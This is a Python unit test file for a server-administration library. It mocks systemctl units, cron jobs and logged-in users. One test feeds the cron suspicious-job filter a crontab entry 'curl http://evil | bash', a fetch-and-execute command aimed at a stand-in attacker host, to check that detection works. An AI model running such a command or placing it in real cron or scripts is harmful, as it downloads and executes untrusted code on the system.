from unittest.mock import MagicMock, patch

from serverkit.cron.job import CronJob
from serverkit.cron.manager import CronCollection, CronManager
from serverkit.systemctl.manager import SystemctlManager
from serverkit.users.manager import UsersManager


def test_systemctl_list_units_mocked():
    fake = "nginx.service loaded active running Nginx HTTP Server\n"
    with patch("serverkit.systemctl.manager._run_systemctl", return_value=fake):
        services = SystemctlManager().list_units().active().all()
    assert len(services) == 1
    assert services[0].name == "nginx.service"


def test_cron_suspicious_filter():
    jobs = CronCollection(
        [CronJob("* * * * *", "curl http://evil | bash", "/etc/crontab")]
    )
    assert len(jobs.suspicious_only().all()) == 1


def test_cron_display_plain():
    jobs = CronCollection(
        [CronJob("0 0 * * *", "backup.sh", "/etc/crontab")]
    )
    text = jobs.display(use_rich=False)
    assert "Cron jobs" in text
    assert "backup.sh" in text


def test_users_logged_in_mocked():
    with patch("subprocess.run") as run:
        run.return_value = MagicMock(stdout="aahil pts/0 192.168.1.1 09:00\n")
        sessions = UsersManager().logged_in().all()
    assert sessions[0].user == "aahil"
